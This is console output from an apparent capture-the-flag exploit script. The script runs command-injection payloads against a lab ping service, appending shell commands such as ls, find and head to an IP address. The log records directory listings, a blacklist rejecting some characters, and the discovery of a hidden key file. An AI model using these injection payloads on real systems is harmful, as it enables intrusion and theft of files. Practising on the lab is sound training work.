64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.71 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.71 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.77 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.619/3.699/3.769/0.053 ms
================= OPERATION: SILENT ECHO =================
                  CLASSIFICATION: BLACK ICE

Agent, your objective is to recover the Blacksite Key.
Our intel confirms it’s hidden deep within the AetherCorp network.

=========================================================
================================================================================

[17/26] Testing: Read with nl

================================================================================
PAYLOAD: Read with nl
Command: 8.8.8.8
nl mission_briefing.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.75 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.78 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.649/3.737/3.781/0.051 ms
     1  ================= OPERATION: SILENT ECHO =================
     2                    CLASSIFICATION: BLACK ICE

     3  Agent, your objective is to recover the Blacksite Key.
     4  Our intel confirms it’s hidden deep within the AetherCorp network.

     5  =========================================================

================================================================================

[18/26] Testing: List root files

================================================================================
PAYLOAD: List root files
Command: 8.8.8.8
ls -la /
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.66 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.75 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.87 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.661/3.764/3.870/0.074 ms
total 68
drwxr-xr-x   1 root root 4096 Oct  4 11:54 .
drwxr-xr-x   1 root root 4096 Oct  4 11:54 ..
-rwxr-xr-x   1 root root    0 Oct  4 11:54 .dockerenv
drwxr-xr-x   1 root root 4096 Oct  4 11:45 app
lrwxrwxrwx   1 root root    7 Aug 24 16:20 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Aug 24 16:20 boot
drwxr-xr-x   5 root root  340 Oct  4 11:54 dev
drwxr-xr-x   1 root root 4096 Oct  4 11:54 etc
drwxr-xr-x   2 root root 4096 Aug 24 16:20 home
lrwxrwxrwx   1 root root    7 Aug 24 16:20 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Aug 24 16:20 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Sep 29 00:00 media
drwxr-xr-x   2 root root 4096 Sep 29 00:00 mnt
drwxr-xr-x   2 root root 4096 Sep 29 00:00 opt
dr-xr-xr-x 225 root root    0 Oct  4 11:54 proc
drwx------   1 root root 4096 Sep 30 00:37 root
drwxr-xr-x   1 root root 4096 Oct  4 11:45 run
lrwxrwxrwx   1 root root    8 Aug 24 16:20 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Sep 29 00:00 srv
dr-xr-xr-x  12 root root    0 Oct  4 11:54 sys
drwxrwxrwt   1 root root 4096 Oct  4 14:11 tmp
drwxr-xr-x   1 root root 4096 Sep 29 00:00 usr
drwxr-xr-x   1 root root 4096 Sep 29 00:00 var

================================================================================

[19/26] Testing: Find all txt files

================================================================================
PAYLOAD: Find all txt files
Command: 8.8.8.8
find / -name '*.txt' -type f 2>/dev/null
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.72 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.677/3.737/3.780/0.041 ms
/usr/local/lib/python3.11/LICENSE.txt
/usr/local/lib/python3.11/site-packages/pip-24.0.dist-info/LICENSE.txt
/usr/local/lib/python3.11/site-packages/pip-24.0.dist-info/AUTHORS.txt
/usr/local/lib/python3.11/site-packages/pip-24.0.dist-info/entry_points.txt
/usr/local/lib/python3.11/site-packages/pip-24.0.dist-info/top_level.txt
/usr/local/lib/python3.11/site-packages/setuptools-65.5.1.dist-info/entry_points.txt
/usr/local/lib/python3.11/site-packages/setuptools-65.5.1.dist-info/top_level.txt
/usr/local/lib/python3.11/site-packages/wheel-0.45.1.dist-info/LICENSE.txt
/usr/local/lib/python3.11/site-packages/wheel-0.45.1.dist-info/entry_points.txt
/usr/local/lib/python3.11/site-packages/pip/_vendor/vendor.txt
/usr/local/lib/python3.11/site-packages/wheel/vendored/vendor.txt
/usr/local/lib/python3.11/site-packages/README.txt
/usr/local/lib/python3.11/site-packages/flask-3.1.2.dist-info/entry_points.txt
/usr/local/lib/python3.11/site-packages/flask-3.1.2.dist-info/licenses/LICENSE.txt
/usr/local/lib/python3.11/site-packages/click-8.3.0.dist-info/licenses/LICENSE.txt
/usr/local/lib/python3.11/site-packages/itsdangerous-2.2.0.dist-info/LICENSE.txt
/usr/local/lib/python3.11/site-packages/gunicorn-23.0.0.dist-info/entry_points.txt
/usr/local/lib/python3.11/site-packages/gunicorn-23.0.0.dist-info/top_level.txt
/usr/local/lib/python3.11/site-packages/jinja2-3.1.6.dist-info/entry_points.txt
/usr/local/lib/python3.11/site-packages/jinja2-3.1.6.dist-info/licenses/LICENSE.txt
/usr/local/lib/python3.11/site-packages/blinker-1.9.0.dist-info/LICENSE.txt
/usr/local/lib/python3.11/site-packages/markupsafe-3.0.3.dist-info/licenses/LICENSE.txt
/usr/local/lib/python3.11/site-packages/markupsafe-3.0.3.dist-info/top_level.txt
/usr/local/lib/python3.11/site-packages/werkzeug-3.1.3.dist-info/LICENSE.txt
/usr/local/lib/python3.11/lib2to3/PatternGrammar.txt
/usr/local/lib/python3.11/lib2to3/Grammar.txt
/usr/local/lib/python3.11/idlelib/NEWS2x.txt
/usr/local/lib/python3.11/idlelib/Icons/README.txt
/usr/local/lib/python3.11/idlelib/TODO.txt
/usr/local/lib/python3.11/idlelib/CREDITS.txt
/usr/local/lib/python3.11/idlelib/extend.txt
/usr/local/lib/python3.11/idlelib/HISTORY.txt
/usr/local/lib/python3.11/idlelib/News3.txt
/usr/local/lib/python3.11/idlelib/README.txt
/var/lib/aethercorp/reports/report_0816.txt
/var/lib/aethercorp/reports/report_0815.txt
/var/lib/aethercorp/missions/mission_alpha.txt
/var/lib/aethercorp/missions/mission_beta.txt
/app/mission_briefing.txt
/app/requirements.txt

================================================================================

[20/26] Testing: Show all hidden files

================================================================================
PAYLOAD: Show all hidden files
Command: 8.8.8.8
ls -laR
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.76 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.75 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.645/3.730/3.771/0.050 ms
.:
total 24
drwxr-xr-x 1 root root 4096 Oct  4 11:45 .
drwxr-xr-x 1 root root 4096 Oct  4 11:54 ..
-rwxr-xr-x 1 root root 2298 Oct  4 07:38 app.py
-rwxr-xr-x 1 root root  290 Oct  4 07:38 mission_briefing.txt
-rwxr-xr-x 1 root root   14 Oct  4 07:38 requirements.txt
drwxr-xr-x 2 root root 4096 Oct  4 07:38 templates

./templates:
total 16
drwxr-xr-x 2 root root 4096 Oct  4 07:38 .
drwxr-xr-x 1 root root 4096 Oct  4 11:45 ..
-rwxr-xr-x 1 root root 5021 Oct  4 07:38 index.html

================================================================================

[21/26] Testing: Read /flag

================================================================================
PAYLOAD: Read /flag
Command: 8.8.8.8
head /flag
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.76 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.78 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.648/3.738/3.780/0.052 ms
head: cannot open '/flag' for reading: No such file or directory

================================================================================

[22/26] Testing: Read /flag.txt

================================================================================
PAYLOAD: Read /flag.txt
Command: 8.8.8.8
head /flag.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.80 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.77 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.667/3.754/3.803/0.051 ms
head: cannot open '/flag.txt' for reading: No such file or directory

================================================================================

[23/26] Testing: Read flag.txt

================================================================================
PAYLOAD: Read flag.txt
Command: 8.8.8.8
head flag.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.82 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.74 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.80 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.651/3.752/3.815/0.064 ms
head: cannot open 'flag.txt' for reading: No such file or directory

================================================================================

[24/26] Testing: Awk read mission_briefing

================================================================================
PAYLOAD: Awk read mission_briefing
Command: 8.8.8.8
awk '{print}' mission_briefing.txt
--------------------------------------------------------------------------------
Error: Malicious character '{' detected.
================================================================================

[25/26] Testing: Find base64 patterns

================================================================================
PAYLOAD: Find base64 patterns
Command: 8.8.8.8
strings mission_briefing.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.81 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.78 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 3.677/3.759/3.812/0.050 ms
/bin/sh: 2: strings: not found

================================================================================

[26/26] Testing: Read all txt files

================================================================================
PAYLOAD: Read all txt files
Command: 8.8.8.8
find . -name '*.txt' -exec head {} \;
--------------------------------------------------------------------------------
Error: Malicious character ';' detected.
================================================================================


================================================================================
Exploitation complete!
================================================================================

C:\Citadel_CTF_Writeups>python -u "c:\Citadel_CTF_Writeups\ext2.py"


[1/20] Testing: Read mission_alpha.txt

================================================================================
PAYLOAD: Read mission_alpha.txt
Command: 8.8.8.8
head /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.71 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.69 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.651/3.706/3.774/0.044 ms
Mission Alpha: Recon success. Target: Sector 7G

================================================================================

[2/20] Testing: Read mission_beta.txt

================================================================================
PAYLOAD: Read mission_beta.txt
Command: 8.8.8.8
head /var/lib/aethercorp/missions/mission_beta.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.63 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.76 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.75 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.66 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.626/3.699/3.759/0.056 ms
Mission Beta: Signal interception failed. Retry required.

================================================================================

[3/20] Testing: Read report_0815.txt

================================================================================
PAYLOAD: Read report_0815.txt
Command: 8.8.8.8
head /var/lib/aethercorp/reports/report_0815.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.73 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.72 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.78 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.670/3.727/3.782/0.039 ms
Report 2025-08-15: All systems nominal. No intrusions detected.

================================================================================

[4/20] Testing: Read report_0816.txt

================================================================================
PAYLOAD: Read report_0816.txt
Command: 8.8.8.8
head /var/lib/aethercorp/reports/report_0816.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.60 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.70 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.602/3.681/3.780/0.065 ms
Report 2025-08-16: Minor network anomaly detected. Flagged for review.

================================================================================

[5/20] Testing: Full mission_alpha.txt

================================================================================
PAYLOAD: Full mission_alpha.txt
Command: 8.8.8.8
more /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.76 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.74 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.68 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.674/3.712/3.757/0.035 ms
::::::::::::::
/var/lib/aethercorp/missions/mission_alpha.txt
::::::::::::::
Mission Alpha: Recon success. Target: Sector 7G

================================================================================

[6/20] Testing: Full mission_beta.txt

================================================================================
PAYLOAD: Full mission_beta.txt
Command: 8.8.8.8
more /var/lib/aethercorp/missions/mission_beta.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.66 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.71 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.73 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.71 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.661/3.703/3.734/0.026 ms
::::::::::::::
/var/lib/aethercorp/missions/mission_beta.txt
::::::::::::::
Mission Beta: Signal interception failed. Retry required.

================================================================================

[7/20] Testing: Full report_0815.txt

================================================================================
PAYLOAD: Full report_0815.txt
Command: 8.8.8.8
more /var/lib/aethercorp/reports/report_0815.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.79 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.71 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.84 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.665/3.749/3.839/0.068 ms
::::::::::::::
/var/lib/aethercorp/reports/report_0815.txt
::::::::::::::
Report 2025-08-15: All systems nominal. No intrusions detected.

================================================================================

[8/20] Testing: Full report_0816.txt

================================================================================
PAYLOAD: Full report_0816.txt
Command: 8.8.8.8
more /var/lib/aethercorp/reports/report_0816.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.57 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=11.8 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.90 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.569/5.751/11.775/3.479 ms
::::::::::::::
/var/lib/aethercorp/reports/report_0816.txt
::::::::::::::
Report 2025-08-16: Minor network anomaly detected. Flagged for review.

================================================================================

[9/20] Testing: Tail mission_alpha.txt

================================================================================
PAYLOAD: Tail mission_alpha.txt
Command: 8.8.8.8
tail -n 50 /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.72 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.70 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.675/3.692/3.717/0.016 ms
Mission Alpha: Recon success. Target: Sector 7G

================================================================================

[10/20] Testing: Tail mission_beta.txt

================================================================================
PAYLOAD: Tail mission_beta.txt
Command: 8.8.8.8
tail -n 50 /var/lib/aethercorp/missions/mission_beta.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.65 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.73 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.74 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.73 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.647/3.710/3.740/0.037 ms
Mission Beta: Signal interception failed. Retry required.

================================================================================

[11/20] Testing: NL mission_alpha.txt

================================================================================
PAYLOAD: NL mission_alpha.txt
Command: 8.8.8.8
nl /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.62 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.83 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.80 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.78 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.622/3.757/3.830/0.080 ms
     1  Mission Alpha: Recon success. Target: Sector 7G

================================================================================

[12/20] Testing: NL mission_beta.txt

================================================================================
PAYLOAD: NL mission_beta.txt
Command: 8.8.8.8
nl /var/lib/aethercorp/missions/mission_beta.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.72 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.80 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.76 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=13.3 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.717/6.152/13.324/4.140 ms
     1  Mission Beta: Signal interception failed. Retry required.

================================================================================

[13/20] Testing: List aethercorp dir

================================================================================
PAYLOAD: List aethercorp dir
Command: 8.8.8.8
ls -laR /var/lib/aethercorp/
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.63 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.87 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.71 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.633/3.749/3.873/0.087 ms
/var/lib/aethercorp/:
total 40
dr-xr-x--- 8 root ctf  4096 Oct  4 11:45 .
drwxr-xr-x 1 root root 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf    17 Oct  4 11:45 VERSION
dr-xr-x--- 3 root ctf  4096 Oct  4 11:45 archive
dr-xr-x--- 3 root ctf  4096 Oct  4 11:45 cache
dr-xr-x--- 2 root ctf  4096 Oct  4 11:45 configs
dr-xr-x--- 2 root ctf  4096 Oct  4 11:45 logs
dr-xr-x--- 2 root ctf  4096 Oct  4 11:45 missions
-r-xr-x--- 1 root ctf     5 Oct  4 11:45 netprobe.pid
dr-xr-x--- 2 root ctf  4096 Oct  4 11:45 reports

/var/lib/aethercorp/archive:
total 12
dr-xr-x--- 3 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .secrets

/var/lib/aethercorp/archive/.secrets:
total 12
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 3 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf   34 Oct  4 11:45 blacksite_key.dat

/var/lib/aethercorp/cache:
total 12
dr-xr-x--- 3 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 telemetry

/var/lib/aethercorp/cache/telemetry:
total 16
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 3 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf   61 Oct  4 11:45 telemetry_001.log
-r-xr-x--- 1 root ctf   61 Oct  4 11:45 telemetry_002.log

/var/lib/aethercorp/configs:
total 12
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf  102 Oct  4 11:45 probe_config.xml

/var/lib/aethercorp/logs:
total 12
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf  272 Oct  4 11:45 system_health.log

/var/lib/aethercorp/missions:
total 16
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf   48 Oct  4 11:45 mission_alpha.txt
-r-xr-x--- 1 root ctf   58 Oct  4 11:45 mission_beta.txt

/var/lib/aethercorp/reports:
total 16
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf   64 Oct  4 11:45 report_0815.txt
-r-xr-x--- 1 root ctf   71 Oct  4 11:45 report_0816.txt

================================================================================

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!! POTENTIAL FLAG FOUND IN OUTPUT ABOVE !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

[14/20] Testing: Find all aethercorp files

================================================================================
PAYLOAD: Find all aethercorp files
Command: 8.8.8.8
find /var/lib/aethercorp/ -type f
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.66 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.70 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.69 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.662/3.705/3.776/0.042 ms
/var/lib/aethercorp/cache/telemetry/telemetry_002.log
/var/lib/aethercorp/cache/telemetry/telemetry_001.log
/var/lib/aethercorp/logs/system_health.log
/var/lib/aethercorp/reports/report_0816.txt
/var/lib/aethercorp/reports/report_0815.txt
/var/lib/aethercorp/archive/.secrets/blacksite_key.dat
/var/lib/aethercorp/VERSION
/var/lib/aethercorp/configs/probe_config.xml
/var/lib/aethercorp/netprobe.pid
/var/lib/aethercorp/missions/mission_alpha.txt
/var/lib/aethercorp/missions/mission_beta.txt

================================================================================

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!! POTENTIAL FLAG FOUND IN OUTPUT ABOVE !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

[15/20] Testing: Check for hidden in missions

================================================================================
PAYLOAD: Check for hidden in missions
Command: 8.8.8.8
ls -la /var/lib/aethercorp/missions/
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.70 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.76 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.79 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.81 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.701/3.763/3.811/0.041 ms
total 16
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf   48 Oct  4 11:45 mission_alpha.txt
-r-xr-x--- 1 root ctf   58 Oct  4 11:45 mission_beta.txt

================================================================================

[16/20] Testing: Check for hidden in reports

================================================================================
PAYLOAD: Check for hidden in reports
Command: 8.8.8.8
ls -la /var/lib/aethercorp/reports/
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.69 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.75 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.84 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.690/3.763/3.840/0.054 ms
total 16
dr-xr-x--- 2 root ctf 4096 Oct  4 11:45 .
dr-xr-x--- 8 root ctf 4096 Oct  4 11:45 ..
-r-xr-x--- 1 root ctf   64 Oct  4 11:45 report_0815.txt
-r-xr-x--- 1 root ctf   71 Oct  4 11:45 report_0816.txt

================================================================================

[17/20] Testing: Strings on mission_alpha

================================================================================
PAYLOAD: Strings on mission_alpha
Command: 8.8.8.8
strings /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.63 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.89 ms
